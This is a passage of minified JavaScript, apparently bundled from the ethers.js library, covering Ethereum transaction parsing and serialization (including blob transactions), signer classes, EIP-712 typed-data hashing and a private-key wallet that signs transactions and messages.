                        MS(SS(RR, this), "adding a raw blob requires a KZG library", "UNSUPPORTED_OPERATION", {
                            operation: "set blobs()"
                        });
                        let e = zS(o);
                        if (NS(e.length <= lR, "blob is too large", "blobs[".concat(n, "]"), o),
                        e.length !== lR) {
                            const t = new Uint8Array(lR);
                            t.set(e),
                            e = t
                        }
                        const i = SS(RR, this).blobToKzgCommitment(e)
                          , s = $S(SS(RR, this).computeBlobKzgProof(e, i));
                        t.push({
                            data: $S(e),
                            commitment: $S(i),
                            proof: s
                        }),
                        r.push(uR(1, i))
                    } else {
                        const e = $S(o.commitment);
                        t.push({
                            data: $S(o.data),
                            commitment: e,
                            proof: $S(o.proof)
                        }),
                        r.push(uR(1, e))
                    }
                }
                CS(kR, this, t),
                CS(WR, this, r)
            }
            get kzg() {
                return SS(RR, this)
            }
            set kzg(e) {
                CS(RR, this, e)
            }
            constructor() {
                DB(this, MR),
                ES(this, vR, void 0),
                ES(this, wR, void 0),
                ES(this, TR, void 0),
                ES(this, AR, void 0),
                ES(this, ER, void 0),
                ES(this, PR, void 0),
                ES(this, CR, void 0),
                ES(this, SR, void 0),
                ES(this, IR, void 0),
                ES(this, BR, void 0),
                ES(this, xR, void 0),
                ES(this, OR, void 0),
                ES(this, _R, void 0),
                ES(this, WR, void 0),
                ES(this, RR, void 0),
                ES(this, kR, void 0),
                CS(vR, this, null),
                CS(wR, this, null),
                CS(AR, this, 0),
                CS(ER, this, nR),
                CS(PR, this, null),
                CS(CR, this, null),
                CS(SR, this, null),
                CS(TR, this, "0x"),
                CS(IR, this, nR),
                CS(BR, this, nR),
                CS(xR, this, null),
                CS(OR, this, null),
                CS(_R, this, null),
                CS(WR, this, null),
                CS(kR, this, null),
                CS(RR, this, null)
            }
            get hash() {
                return null == this.signature ? null : ix(PS(MR, this, FR).call(this, !0, !1))
            }
            get unsignedHash() {
                return ix(this.unsignedSerialized)
            }
            get from() {
                return null == this.signature ? null : jO(this.unsignedHash, this.signature)
            }
            get fromPublicKey() {
                return null == this.signature ? null : DO.recoverPublicKey(this.unsignedHash, this.signature)
            }
            isSigned() {
                return null != this.signature
            }
            get serialized() {
                return PS(MR, this, FR).call(this, !0, !0)
            }
            get unsignedSerialized() {
                return PS(MR, this, FR).call(this, !1, !1)
            }
            inferType() {
                const e = this.inferTypes();
                return e.indexOf(2) >= 0 ? 2 : e.pop()
            }
            inferTypes() {
                const e = null != this.gasPrice
                  , t = null != this.maxFeePerGas || null != this.maxPriorityFeePerGas
                  , r = null != this.accessList
                  , n = null != SS(_R, this) || SS(WR, this);
                null != this.maxFeePerGas && null != this.maxPriorityFeePerGas && MS(this.maxFeePerGas >= this.maxPriorityFeePerGas, "priorityFee cannot be more than maxFee", "BAD_DATA", {
                    value: this
                }),
                MS(!t || 0 !== this.type && 1 !== this.type, "transaction type cannot have maxFeePerGas or maxPriorityFeePerGas", "BAD_DATA", {
                    value: this
                }),
                MS(0 !== this.type || !r, "legacy transaction cannot have accessList", "BAD_DATA", {
                    value: this
                });
                const o = [];
                return null != this.type ? o.push(this.type) : t ? o.push(2) : e ? (o.push(1),
                r || o.push(0)) : r ? (o.push(1),
                o.push(2)) : (n && this.to || (o.push(0),
                o.push(1),
                o.push(2)),
                o.push(3)),
                o.sort(),
                o
            }
            isLegacy() {
                return 0 === this.type
            }
            isBerlin() {
                return 1 === this.type
            }
            isLondon() {
                return 2 === this.type
            }
            isCancun() {
                return 3 === this.type
            }
            clone() {
                return NR.from(this)
            }
            toJSON() {
                const e = e => null == e ? null : e.toString();
                return {
                    type: this.type,
                    to: this.to,
                    data: this.data,
                    nonce: this.nonce,
                    gasLimit: e(this.gasLimit),
                    gasPrice: e(this.gasPrice),
                    maxPriorityFeePerGas: e(this.maxPriorityFeePerGas),
                    maxFeePerGas: e(this.maxFeePerGas),
                    value: e(this.value),
                    chainId: e(this.chainId),
                    sig: this.signature ? this.signature.toJSON() : null,
                    accessList: this.accessList
                }
            }
            static from(e) {
                if (null == e)
                    return new NR;
                if ("string" === typeof e) {
                    const t = zS(e);
                    if (t[0] >= 127)
                        return NR.from(function(e) {
                            const t = YW(e);
                            NS(Array.isArray(t) && (9 === t.length || 6 === t.length), "invalid field count for legacy transaction", "data", e);
                            const r = {
                                type: 0,
                                nonce: fR(t[0], "nonce"),
                                gasPrice: pR(t[1], "gasPrice"),
                                gasLimit: pR(t[2], "gasLimit"),
                                to: dR(t[3]),
                                value: pR(t[4], "value"),
                                data: $S(t[5]),
                                chainId: nR
                            };
                            if (6 === t.length)
                                return r;
                            const n = pR(t[6], "v")
                              , o = pR(t[7], "r")
                              , i = pR(t[8], "s");
                            if (o === nR && i === nR)
                                r.chainId = n;
                            else {
                                let e = (n - aR) / oR;
                                e < nR && (e = nR),
                                r.chainId = e,
                                NS(e !== nR || n === iR || n === sR, "non-canonical legacy v", "v", t[6]),
                                r.signature = PI.from({
                                    r: XS(t[7], 32),
                                    s: XS(t[8], 32),
                                    v: n
                                })
                            }
                            return r
                        }(t));
                    switch (t[0]) {
                    case 1:
                        return NR.from(function(e) {
                            const t = YW(zS(e).slice(1));
                            NS(Array.isArray(t) && (8 === t.length || 11 === t.length), "invalid field count for transaction type: 1", "data", $S(e));
                            const r = {
                                type: 1,
                                chainId: pR(t[0], "chainId"),
                                nonce: fR(t[1], "nonce"),
                                gasPrice: pR(t[2], "gasPrice"),
                                gasLimit: pR(t[3], "gasLimit"),
                                to: dR(t[4]),
                                value: pR(t[5], "value"),
                                data: $S(t[6]),
                                accessList: hR(t[7], "accessList")
                            };
                            return 8 === t.length || bR(r, t.slice(8)),
                            r
                        }(t));
                    case 2:
                        return NR.from(function(e) {
                            const t = YW(zS(e).slice(1));
                            NS(Array.isArray(t) && (9 === t.length || 12 === t.length), "invalid field count for transaction type: 2", "data", $S(e));
                            const r = {
                                type: 2,
                                chainId: pR(t[0], "chainId"),
                                nonce: fR(t[1], "nonce"),
                                maxPriorityFeePerGas: pR(t[2], "maxPriorityFeePerGas"),
                                maxFeePerGas: pR(t[3], "maxFeePerGas"),
                                gasPrice: null,
                                gasLimit: pR(t[4], "gasLimit"),
                                to: dR(t[5]),
                                value: pR(t[6], "value"),
                                data: $S(t[7]),
                                accessList: hR(t[8], "accessList")
                            };
                            return 9 === t.length || bR(r, t.slice(9)),
                            r
                        }(t));
                    case 3:
                        return NR.from(function(e) {
                            let t = YW(zS(e).slice(1))
                              , r = "3"
                              , n = null;
                            if (4 === t.length && Array.isArray(t[0])) {
                                r = "3 (network format)";
                                const e = t[1]
                                  , o = t[2]
                                  , i = t[3];
                                NS(Array.isArray(e), "invalid network format: blobs not an array", "fields[1]", e),
                                NS(Array.isArray(o), "invalid network format: commitments not an array", "fields[2]", o),
                                NS(Array.isArray(i), "invalid network format: proofs not an array", "fields[3]", i),
                                NS(e.length === o.length, "invalid network format: blobs/commitments length mismatch", "fields", t),
                                NS(e.length === i.length, "invalid network format: blobs/proofs length mismatch", "fields", t),
                                n = [];
                                for (let r = 0; r < t[1].length; r++)
                                    n.push({
                                        data: e[r],
                                        commitment: o[r],
                                        proof: i[r]
                                    });
                                t = t[0]
                            }
                            NS(Array.isArray(t) && (11 === t.length || 14 === t.length), "invalid field count for transaction type: ".concat(r), "data", $S(e));
                            const o = {
                                type: 3,
                                chainId: pR(t[0], "chainId"),
                                nonce: fR(t[1], "nonce"),
                                maxPriorityFeePerGas: pR(t[2], "maxPriorityFeePerGas"),
                                maxFeePerGas: pR(t[3], "maxFeePerGas"),
                                gasPrice: null,
                                gasLimit: pR(t[4], "gasLimit"),
                                to: dR(t[5]),
                                value: pR(t[6], "value"),
                                data: $S(t[7]),
                                accessList: hR(t[8], "accessList"),
                                maxFeePerBlobGas: pR(t[9], "maxFeePerBlobGas"),
                                blobVersionedHashes: t[10]
                            };
                            n && (o.blobs = n),
                            NS(null != o.to, "invalid address for transaction type: ".concat(r), "data", e),
                            NS(Array.isArray(o.blobVersionedHashes), "invalid blobVersionedHashes: must be an array", "data", e);
                            for (let i = 0; i < o.blobVersionedHashes.length; i++)
                                NS(HS(o.blobVersionedHashes[i], 32), "invalid blobVersionedHash at index ".concat(i, ": must be length 32"), "data", e);
                            return 11 === t.length || bR(o, t.slice(11)),
                            o
                        }(t))
                    }
                    MS(!1, "unsupported transaction type", "UNSUPPORTED_OPERATION", {
                        operation: "from"
                    })
                }
                const t = new NR;
                return null != e.type && (t.type = e.type),
                null != e.to && (t.to = e.to),
                null != e.nonce && (t.nonce = e.nonce),
                null != e.gasLimit && (t.gasLimit = e.gasLimit),
                null != e.gasPrice && (t.gasPrice = e.gasPrice),
                null != e.maxPriorityFeePerGas && (t.maxPriorityFeePerGas = e.maxPriorityFeePerGas),
                null != e.maxFeePerGas && (t.maxFeePerGas = e.maxFeePerGas),
                null != e.maxFeePerBlobGas && (t.maxFeePerBlobGas = e.maxFeePerBlobGas),
                null != e.data && (t.data = e.data),
                null != e.value && (t.value = e.value),
                null != e.chainId && (t.chainId = e.chainId),
                null != e.signature && (t.signature = PI.from(e.signature)),
                null != e.accessList && (t.accessList = e.accessList),
                null != e.blobVersionedHashes && (t.blobVersionedHashes = e.blobVersionedHashes),
                null != e.kzg && (t.kzg = e.kzg),
                null != e.blobs && (t.blobs = e.blobs),
                null != e.hash && (NS(t.isSigned(), "unsigned transaction cannot define '.hash'", "tx", e),
                NS(t.hash === e.hash, "hash mismatch", "tx", e)),
                null != e.from && (NS(t.isSigned(), "unsigned transaction cannot define '.from'", "tx", e),
                NS(t.from.toLowerCase() === (e.from || "").toLowerCase(), "from mismatch", "tx", e)),
                t
            }
        }
        function FR(e, t) {
            MS(!e || null != this.signature, "cannot serialize unsigned transaction; maybe you meant .unsignedSerialized", "UNSUPPORTED_OPERATION", {
                operation: ".serialized"
            });
            const r = e ? this.signature : null;
            switch (this.inferType()) {
            case 0:
                return function(e, t) {
                    const r = [gR(e.nonce, "nonce"), gR(e.gasPrice || 0, "gasPrice"), gR(e.gasLimit, "gasLimit"), e.to || "0x", gR(e.value, "value"), e.data];
                    let n = nR;
                    if (e.chainId != nR)
                        n = oI(e.chainId, "tx.chainId"),
                        NS(!t || null == t.networkV || t.legacyChainId === n, "tx.chainId/sig.v mismatch", "sig", t);
                    else if (e.signature) {
                        const t = e.signature.legacyChainId;
                        null != t && (n = t)
                    }
                    if (!t)
                        return n !== nR && (r.push(uI(n)),
                        r.push("0x"),
                        r.push("0x")),
                        eR(r);
                    let o = BigInt(27 + t.yParity);
                    return n !== nR ? o = PI.getChainIdV(n, t.v) : BigInt(t.v) !== o && NS(!1, "tx.chainId/sig.v mismatch", "sig", t),
                    r.push(uI(o)),
                    r.push(uI(t.r)),
                    r.push(uI(t.s)),
                    eR(r)
                }(this, r);
            case 1:
                return function(e, t) {
                    const r = [gR(e.chainId, "chainId"), gR(e.nonce, "nonce"), gR(e.gasPrice || 0, "gasPrice"), gR(e.gasLimit, "gasLimit"), e.to || "0x", gR(e.value, "value"), e.data, yR(e.accessList || [])];
                    return t && (r.push(gR(t.yParity, "recoveryParam")),
                    r.push(uI(t.r)),
                    r.push(uI(t.s))),
                    KS(["0x01", eR(r)])
                }(this, r);
            case 2:
                return function(e, t) {
                    const r = [gR(e.chainId, "chainId"), gR(e.nonce, "nonce"), gR(e.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"), gR(e.maxFeePerGas || 0, "maxFeePerGas"), gR(e.gasLimit, "gasLimit"), e.to || "0x", gR(e.value, "value"), e.data, yR(e.accessList || [])];
                    return t && (r.push(gR(t.yParity, "yParity")),
                    r.push(uI(t.r)),
                    r.push(uI(t.s))),
                    KS(["0x02", eR(r)])
                }(this, r);
            case 3:
                return function(e, t, r) {
                    const n = [gR(e.chainId, "chainId"), gR(e.nonce, "nonce"), gR(e.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"), gR(e.maxFeePerGas || 0, "maxFeePerGas"), gR(e.gasLimit, "gasLimit"), e.to || qW, gR(e.value, "value"), e.data, yR(e.accessList || []), gR(e.maxFeePerBlobGas || 0, "maxFeePerBlobGas"), mR(e.blobVersionedHashes || [], "blobVersionedHashes")];
                    return t && (n.push(gR(t.yParity, "yParity")),
                    n.push(uI(t.r)),
                    n.push(uI(t.s)),
                    r) ? KS(["0x03", eR([n, r.map((e => e.data)), r.map((e => e.commitment)), r.map((e => e.proof))])]) : KS(["0x03", eR(n)])
                }(this, r, t ? this.blobs : null)
            }
            MS(!1, "unsupported transaction type", "UNSUPPORTED_OPERATION", {
                operation: ".serialized"
            })
        }
        BigInt(0);
        function UR(e) {
            const t = {};
            e.to && (t.to = e.to),
            e.from && (t.from = e.from),
            e.data && (t.data = $S(e.data));
            const r = "chainId,gasLimit,gasPrice,maxFeePerBlobGas,maxFeePerGas,maxPriorityFeePerGas,value".split(/,/);
            for (const o of r)
                o in e && null != e[o] && (t[o] = oI(e[o], "request.".concat(o)));
            const n = "type,nonce".split(/,/);
            for (const o of n)
                o in e && null != e[o] && (t[o] = cI(e[o], "request.".concat(o)));
            return e.accessList && (t.accessList = rR(e.accessList)),
            "blockTag"in e && (t.blockTag = e.blockTag),
            "enableCcipRead"in e && (t.enableCcipRead = !!e.enableCcipRead),
            "customData"in e && (t.customData = e.customData),
            "blobVersionedHashes"in e && e.blobVersionedHashes && (t.blobVersionedHashes = e.blobVersionedHashes.slice()),
            "kzg"in e && (t.kzg = e.kzg),
            "blobs"in e && e.blobs && (t.blobs = e.blobs.map((e => qS(e) ? $S(e) : Object.assign({}, e)))),
            t
        }
        Symbol.iterator;
        Symbol.iterator;
        function DR(e, t) {
            if (e.provider)
                return e.provider;
            MS(!1, "missing provider", "UNSUPPORTED_OPERATION", {
                operation: t
            })
        }
        async function LR(e, t) {
            let r = UR(t);
            if (null != r.to && (r.to = HW(r.to, e)),
            null != r.from) {
                const t = r.from;
                r.from = Promise.all([e.getAddress(), HW(t, e)]).then((e => {
                    let[t,r] = e;
                    return NS(t.toLowerCase() === r.toLowerCase(), "transaction from mismatch", "tx.from", r),
                    t
                }
                ))
            } else
                r.from = e.getAddress();
            return await OS(r)
        }
        class jR {
            constructor(e) {
                (0,
                CI.A)(this, "provider", void 0),
                _S(this, {
                    provider: e || null
                })
            }
            async getNonce(e) {
                return DR(this, "getTransactionCount").getTransactionCount(await this.getAddress(), e)
            }
            async populateCall(e) {
                return await LR(this, e)
            }
            async populateTransaction(e) {
                const t = DR(this, "populateTransaction")
                  , r = await LR(this, e);
                null == r.nonce && (r.nonce = await this.getNonce("pending")),
                null == r.gasLimit && (r.gasLimit = await this.estimateGas(r));
                const n = await this.provider.getNetwork();
                if (null != r.chainId) {
                    NS(oI(r.chainId) === n.chainId, "transaction chainId mismatch", "tx.chainId", e.chainId)
                } else
                    r.chainId = n.chainId;
                const o = null != r.maxFeePerGas || null != r.maxPriorityFeePerGas;
                if (null == r.gasPrice || 2 !== r.type && !o ? 0 !== r.type && 1 !== r.type || !o || NS(!1, "pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas", "tx", e) : NS(!1, "eip-1559 transaction do not support gasPrice", "tx", e),
                2 !== r.type && null != r.type || null == r.maxFeePerGas || null == r.maxPriorityFeePerGas)
                    if (0 === r.type || 1 === r.type) {
                        const e = await t.getFeeData();
                        MS(null != e.gasPrice, "network does not support gasPrice", "UNSUPPORTED_OPERATION", {
                            operation: "getGasPrice"
                        }),
                        null == r.gasPrice && (r.gasPrice = e.gasPrice)
                    } else {
                        const e = await t.getFeeData();
                        if (null == r.type)
                            if (null != e.maxFeePerGas && null != e.maxPriorityFeePerGas)
                                if (r.type = 2,
                                null != r.gasPrice) {
                                    const e = r.gasPrice;
                                    delete r.gasPrice,
                                    r.maxFeePerGas = e,
                                    r.maxPriorityFeePerGas = e
                                } else
                                    null == r.maxFeePerGas && (r.maxFeePerGas = e.maxFeePerGas),
                                    null == r.maxPriorityFeePerGas && (r.maxPriorityFeePerGas = e.maxPriorityFeePerGas);
                            else
                                null != e.gasPrice ? (MS(!o, "network does not support EIP-1559", "UNSUPPORTED_OPERATION", {
                                    operation: "populateTransaction"
                                }),
                                null == r.gasPrice && (r.gasPrice = e.gasPrice),
                                r.type = 0) : MS(!1, "failed to get consistent fee data", "UNSUPPORTED_OPERATION", {
                                    operation: "signer.getFeeData"
                                });
                        else
                            2 !== r.type && 3 !== r.type || (null == r.maxFeePerGas && (r.maxFeePerGas = e.maxFeePerGas),
                            null == r.maxPriorityFeePerGas && (r.maxPriorityFeePerGas = e.maxPriorityFeePerGas))
                    }
                else
                    r.type = 2;
                return await OS(r)
            }
            async estimateGas(e) {
                return DR(this, "estimateGas").estimateGas(await this.populateCall(e))
            }
            async call(e) {
                return DR(this, "call").call(await this.populateCall(e))
            }
            async resolveName(e) {
                const t = DR(this, "resolveName");
                return await t.resolveName(e)
            }
            async sendTransaction(e) {
                const t = DR(this, "sendTransaction")
                  , r = await this.populateTransaction(e);
                delete r.from;
                const n = NR.from(r);
                return await t.broadcastTransaction(await this.signTransaction(n))
            }
        }
        var zR = new WeakSet;
        class VR extends jR {
            constructor(e, t) {
                super(t),
                DB(this, zR),
                (0,
                CI.A)(this, "address", void 0),
                _S(this, {
                    address: e
                })
            }
            async getAddress() {
                return this.address
            }
            connect(e) {
                return new VR(this.address,e)
            }
            async signTransaction(e) {
                PS(zR, this, HR).call(this, "transactions", "signTransaction")
            }
            async signMessage(e) {
                PS(zR, this, HR).call(this, "messages", "signMessage")
            }
            async signTypedData(e, t, r) {
                PS(zR, this, HR).call(this, "typed-data", "signTypedData")
            }
        }
        function HR(e, t) {
            MS(!1, "VoidSigner cannot sign ".concat(e), "UNSUPPORTED_OPERATION", {
                operation: t
            })
        }
        const qR = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        let GR = null;
        function $R(e) {
            if (null == GR) {
                GR = {};
                for (let e = 0; e < 58; e++)
                    GR[qR[e]] = BigInt(e)
            }
            const t = GR[e];
            return NS(null != t, "invalid base58 value", "letter", e),
            t
        }
        const KR = BigInt(0)
          , ZR = BigInt(58);
        function YR(e) {
            return "string" === typeof e && (e = FB(e)),
            ix(KS([FB("\x19Ethereum Signed Message:\n"), FB(String(e.length)), e]))
        }
        const JR = new Uint8Array(32);
        JR.fill(0);
        const XR = BigInt(-1)
          , QR = BigInt(0)
          , ek = BigInt(1)
          , tk = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        const rk = lI(ek, 32)
          , nk = lI(QR, 32)
          , ok = {
            name: "string",
            version: "string",
            chainId: "uint256",
            verifyingContract: "address",
            salt: "bytes32"
        }
          , ik = ["name", "version", "chainId", "verifyingContract", "salt"];
        function sk(e) {
            return function(t) {
                return NS("string" === typeof t, "invalid domain value for ".concat(JSON.stringify(e)), "domain.".concat(e), t),
                t
            }
        }
        const ak = {
            name: sk("name"),
            version: sk("version"),
            chainId: function(e) {
                const t = oI(e, "domain.chainId");
                return NS(t >= 0, "invalid chain ID", "domain.chainId", e),
                Number.isSafeInteger(t) ? Number(t) : dI(t)
            },
            verifyingContract: function(e) {
                try {
                    return Nx(e).toLowerCase()
                } catch (t) {}
                NS(!1, 'invalid domain value "verifyingContract"', "domain.verifyingContract", e)
            },
            salt: function(e) {
                const t = zS(e, "domain.salt");
                return NS(32 === t.length, 'invalid domain value "salt"', "domain.salt", e),
                $S(t)
            }
        };
        function ck(e) {
            {
                const t = e.match(/^(u?)int(\d+)$/);
                if (t) {
                    const r = "" === t[1]
                      , n = parseInt(t[2]);
                    NS(n % 8 === 0 && 0 !== n && n <= 256 && t[2] === String(n), "invalid numeric width", "type", e);
                    const o = nI(tk, r ? n - 1 : n)
                      , i = r ? (o + ek) * XR : QR;
                    return function(t) {
                        const n = oI(t, "value");
                        return NS(n >= i && n <= o, "value out-of-bounds for ".concat(e), "value", n),
                        lI(r ? rI(n, 256) : n, 32)
                    }
                }
            }
            {
                const t = e.match(/^bytes(\d+)$/);
                if (t) {
                    const r = parseInt(t[1]);
                    return NS(0 !== r && r <= 32 && t[1] === String(r), "invalid bytes width", "type", e),
                    function(t) {
                        return NS(zS(t).length === r, "invalid length for ".concat(e), "value", t),
                        function(e) {
                            const t = zS(e)
                              , r = t.length % 32;
                            return r ? KS([t, JR.slice(r)]) : $S(t)
                        }(t)
                    }
                }
            }
            switch (e) {
            case "address":
                return function(e) {
                    return XS(Nx(e), 32)
                }
                ;
            case "bool":
                return function(e) {
                    return e ? rk : nk
                }
                ;
            case "bytes":
                return function(e) {
                    return ix(e)
                }
                ;
            case "string":
                return function(e) {
                    return sx(e)
                }
            }
            return null
        }
        function lk(e, t) {
            return "".concat(e, "(").concat(t.map((e => {
                let {name: t, type: r} = e;
                return r + " " + t
            }
            )).join(","), ")")
        }
        function uk(e) {
            const t = e.match(/^([^\x5b]*)((\x5b\d*\x5d)*)(\x5b(\d*)\x5d)$/);
            return t ? {
                base: t[1],
                index: t[2] + t[4],
                array: {
                    base: t[1],
                    prefix: t[1] + t[2],
                    count: t[5] ? parseInt(t[5]) : -1
                }
            } : {
                base: e
            }
        }
        var dk = new WeakMap
          , hk = new WeakMap
          , fk = new WeakMap
          , pk = new WeakSet;
        class gk {
            get types() {
                return JSON.parse(SS(dk, this))
            }
            constructor(e) {
                DB(this, pk),
                (0,
                CI.A)(this, "primaryType", void 0),
                ES(this, dk, void 0),
                ES(this, hk, void 0),
                ES(this, fk, void 0),
                CS(hk, this, new Map),
                CS(fk, this, new Map);
                const t = new Map
                  , r = new Map
                  , n = new Map
                  , o = {};
                Object.keys(e).forEach((i => {
                    o[i] = e[i].map((t => {
                        let {name: r, type: n} = t
                          , {base: o, index: i} = uk(n);
                        return "int" !== o || e.int || (o = "int256"),
                        "uint" !== o || e.uint || (o = "uint256"),
                        {
                            name: r,
                            type: o + (i || "")
                        }
                    }
                    )),
                    t.set(i, new Set),
                    r.set(i, []),
                    n.set(i, new Set)
                }
                )),
                CS(dk, this, JSON.stringify(o));
                for (const s in o) {
                    const n = new Set;
                    for (const i of o[s]) {
                        NS(!n.has(i.name), "duplicate variable name ".concat(JSON.stringify(i.name), " in ").concat(JSON.stringify(s)), "types", e),
                        n.add(i.name);
                        const o = uk(i.type).base;
                        NS(o !== s, "circular type reference to ".concat(JSON.stringify(o)), "types", e);
                        ck(o) || (NS(r.has(o), "unknown type ".concat(JSON.stringify(o)), "types", e),
                        r.get(o).push(s),
                        t.get(s).add(o))
                    }
                }
                const i = Array.from(r.keys()).filter((e => 0 === r.get(e).length));
                NS(0 !== i.length, "missing primary type", "types", e),
                NS(1 === i.length, "ambiguous primary types or unused types: ".concat(i.map((e => JSON.stringify(e))).join(", ")), "types", e),
                _S(this, {
                    primaryType: i[0]
                }),
                function o(i, s) {
                    NS(!s.has(i), "circular type reference to ".concat(JSON.stringify(i)), "types", e),
                    s.add(i);
                    for (const e of t.get(i))
                        if (r.has(e)) {
                            o(e, s);
                            for (const t of s)
                                n.get(t).add(e)
                        }
                    s.delete(i)
                }(this.primaryType, new Set);
                for (const [s,a] of n) {
                    const e = Array.from(a);
                    e.sort(),
                    SS(hk, this).set(s, lk(s, o[s]) + e.map((e => lk(e, o[e]))).join(""))
                }
            }
            getEncoder(e) {
                let t = SS(fk, this).get(e);
                return t || (t = PS(pk, this, yk).call(this, e),
                SS(fk, this).set(e, t)),
                t
            }
            encodeType(e) {
                const t = SS(hk, this).get(e);
                return NS(t, "unknown type: ".concat(JSON.stringify(e)), "name", e),
                t
            }
            encodeData(e, t) {
                return this.getEncoder(e)(t)
            }
            hashStruct(e, t) {
                return ix(this.encodeData(e, t))
            }
            encode(e) {
                return this.encodeData(this.primaryType, e)
            }
            hash(e) {
                return this.hashStruct(this.primaryType, e)
            }
            _visit(e, t, r) {
                if (ck(e))
                    return r(e, t);
                const n = uk(e).array;
                if (n)
                    return NS(-1 === n.count || n.count === t.length, "array length mismatch; expected length ".concat(n.count), "value", t),
                    t.map((e => this._visit(n.prefix, e, r)));
                const o = this.types[e];
                if (o)
                    return o.reduce(( (e, n) => {
                        let {name: o, type: i} = n;
                        return e[o] = this._visit(i, t[o], r),
                        e
                    }
                    ), {});
                NS(!1, "unknown type: ".concat(e), "type", e)
            }
            visit(e, t) {
                return this._visit(this.primaryType, e, t)
            }
            static from(e) {
                return new gk(e)
            }
            static getPrimaryType(e) {
                return gk.from(e).primaryType
            }
            static hashStruct(e, t, r) {
                return gk.from(t).hashStruct(e, r)
            }
            static hashDomain(e) {
                const t = [];
                for (const r in e) {
                    if (null == e[r])
                        continue;
                    const n = ok[r];
                    NS(n, "invalid typed-data domain key: ".concat(JSON.stringify(r)), "domain", e),
                    t.push({
                        name: r,
                        type: n
                    })
                }
                return t.sort(( (e, t) => ik.indexOf(e.name) - ik.indexOf(t.name))),
                gk.hashStruct("EIP712Domain", {
                    EIP712Domain: t
                }, e)
            }
            static encode(e, t, r) {
                return KS(["0x1901", gk.hashDomain(e), gk.from(t).hash(r)])
            }
            static hash(e, t, r) {
                return ix(gk.encode(e, t, r))
            }
            static async resolveNames(e, t, r, n) {
                e = Object.assign({}, e);
                for (const s in e)
                    null == e[s] && delete e[s];
                const o = {};
                e.verifyingContract && !HS(e.verifyingContract, 20) && (o[e.verifyingContract] = "0x");
                const i = gk.from(t);
                i.visit(r, ( (e, t) => ("address" !== e || HS(t, 20) || (o[t] = "0x"),
                t)));
                for (const s in o)
                    o[s] = await n(s);
                return e.verifyingContract && o[e.verifyingContract] && (e.verifyingContract = o[e.verifyingContract]),
                {
                    domain: e,
                    value: r = i.visit(r, ( (e, t) => "address" === e && o[t] ? o[t] : t))
                }
            }
            static getPayload(e, t, r) {
                gk.hashDomain(e);
                const n = {}
                  , o = [];
                ik.forEach((t => {
                    const r = e[t];
                    null != r && (n[t] = ak[t](r),
                    o.push({
                        name: t,
                        type: ok[t]
                    }))
                }
                ));
                const i = gk.from(t);
                t = i.types;
                const s = Object.assign({}, t);
                return NS(null == s.EIP712Domain, "types must not contain EIP712Domain type", "types.EIP712Domain", t),
                s.EIP712Domain = o,
                i.encode(r),
                {
                    types: s,
                    domain: n,
                    primaryType: i.primaryType,
                    message: i.visit(r, ( (e, t) => {
                        if (e.match(/^bytes(\d*)/))
                            return $S(zS(t));
                        if (e.match(/^u?int/))
                            return oI(t).toString();
                        switch (e) {
                        case "address":
                            return t.toLowerCase();
                        case "bool":
                            return !!t;
                        case "string":
                            return NS("string" === typeof t, "invalid string", "value", t),
                            t
                        }
                        NS(!1, "unsupported type", "type", e)
                    }
                    ))
                }
            }
        }
        function yk(e) {
            {
                const t = ck(e);
                if (t)
                    return t
            }
            const t = uk(e).array;
            if (t) {
                const e = t.prefix
                  , r = this.getEncoder(e);
                return n => {
                    NS(-1 === t.count || t.count === n.length, "array length mismatch; expected length ".concat(t.count), "value", n);
                    let o = n.map(r);
                    return SS(hk, this).has(e) && (o = o.map(ix)),
                    ix(KS(o))
                }
            }
            const r = this.types[e];
            if (r) {
                const t = sx(SS(hk, this).get(e));
                return e => {
                    const n = r.map((t => {
                        let {name: r, type: n} = t;
                        const o = this.getEncoder(n)(e[r]);
                        return SS(hk, this).has(n) ? ix(o) : o
                    }
                    ));
                    return n.unshift(t),
                    KS(n)
                }
            }
            NS(!1, "unknown type: ".concat(e), "type", e)
        }
        var mk = new WeakMap;
        class bk extends jR {
            constructor(e, t) {
                super(t),
                (0,
                CI.A)(this, "address", void 0),
                ES(this, mk, void 0),
                NS(e && "function" === typeof e.sign, "invalid private key", "privateKey", "[ REDACTED ]"),
                CS(mk, this, e);
                _S(this, {
                    address: LO(this.signingKey.publicKey)
                })
            }
            get signingKey() {
                return SS(mk, this)
            }
            get privateKey() {
                return this.signingKey.privateKey
            }
            async getAddress() {
                return this.address
            }
            connect(e) {
                return new bk(SS(mk, this),e)
            }
            async signTransaction(e) {
                e = UR(e);
                const {to: t, from: r} = await OS({
                    to: e.to ? HW(e.to, this.provider) : void 0,
                    from: e.from ? HW(e.from, this.provider) : void 0
                });
                null != t && (e.to = t),
                null != r && (e.from = r),
                null != e.from && (NS(Nx(e.from) === this.address, "transaction from address mismatch", "tx.from", e.from),
                delete e.from);
                const n = NR.from(e);
                return n.signature = this.signingKey.sign(n.unsignedHash),
                n.serialized
            }
            async signMessage(e) {
                return this.signMessageSync(e)
            }
            signMessageSync(e) {
                return this.signingKey.sign(YR(e)).serialized
            }
            async signTypedData(e, t, r) {
                const n = await gk.resolveNames(e, t, r, (async e => {
                    MS(null != this.provider, "cannot resolve ENS names without a provider", "UNSUPPORTED_OPERATION", {
                        operation: "resolveName",
                        info: {
                            name: e
                        }
                    });
                    const t = await this.provider.resolveName(e);
                    return MS(null != t, "unconfigured ENS name", "UNCONFIGURED_NAME", {
                        value: e
                    }),
                    t
                }
                ));
                return this.signingKey.sign(gk.hash(n.domain, t, n.value)).serialized
            }
        }
        var vk, wk, Tk, Ak = function(e, t, r, n) {
            if ("a" === r && !n)
                throw new TypeError("Private accessor was defined without a getter");
            if ("function" === typeof t ? e !== t || !n : !t.has(e))
                throw new TypeError("Cannot read private member from an object whose class did not declare it");
            return "m" === r ? n : "a" === r ? n.call(e) : n ? n.value : t.get(e)
        }, Ek = function(e, t, r, n, o) {
            if ("m" === n)
                throw new TypeError("Private method is not writable");
            if ("a" === n && !o)
                throw new TypeError("Private accessor was defined without a setter");
            if ("function" === typeof t ? e !== t || !o : !t.has(e))
                throw new TypeError("Cannot write private member to an object whose class did not declare it");
            return "a" === n ? o.call(e, r) : o ? o.value = r : t.set(e, r),
            r
        };
        const Pk = {
            16: 10,
            24: 12,
            32: 14
        }
